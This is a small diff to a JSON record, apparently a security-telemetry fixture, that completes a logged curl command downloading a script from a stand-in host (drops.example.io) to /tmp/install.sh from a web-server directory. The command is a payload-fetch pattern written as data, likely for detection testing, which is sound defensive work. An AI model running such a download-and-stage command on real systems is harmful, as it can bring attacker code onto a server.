@@ -153,9 +153,10 @@
               "curl",
               "-fsSL",
               "-o",
-              "/tmp/install.sh"
+              "/tmp/install.sh",
+              "https://drops.example.io/install.sh"
             ],
-            "args_count": 4,
+            "args_count": 5,
             "entity_id": "azqa-curl-001",
             "working_directory": "/var/www/html",
             "user": {
